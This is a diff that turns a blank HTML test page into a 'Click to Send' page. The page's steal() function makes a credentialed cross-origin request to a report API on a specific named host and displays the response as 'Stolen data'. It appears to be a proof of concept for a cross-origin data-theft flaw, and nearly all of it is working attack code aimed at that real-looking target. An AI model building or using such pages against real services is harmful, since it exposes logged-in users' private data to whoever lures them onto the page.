@@ -1,16 +1,23 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<!DOCTYPE html>
 <html>
-<head>
-  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-  <meta http-equiv="Content-Style-Type" content="text/css">
-  <title></title>
-  <meta name="Generator" content="Cocoa HTML Writer">
-  <meta name="CocoaVersion" content="2575.4">
-  <style type="text/css">
-    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica}
-  </style>
-</head>
-<body>
-<h1>test</h1>
-</body>
+  <body>
+    <h1>Click to Send</h1>
+    <button onclick="steal()">Send</button>
+
+    <script>
+      function steal() {
+        fetch("https://dev3.eyva.ai/api/trpc/report.getReports?input=%7B%22json%22%3A%7B%22order%22%3A%22desc%22%2C%22search%22%3A%22%22%2C%22page%22%3A0%2C%22limit%22%3A50%2C%22reportTypes%22%3A%5B%5D%2C%22industry%22%3A%22BEAUTY%22%7D%7D", {
+          method: "GET",
+          credentials: "include"
+        })
+        .then(res => res.text())
+        .then(data => {
+          alert("Stolen data:\n" + data); // Show in popup
+        })
+        .catch(err => {
+          alert("Error: " + err);
+        });
+      }
+    </script>
+  </body>
 </html>
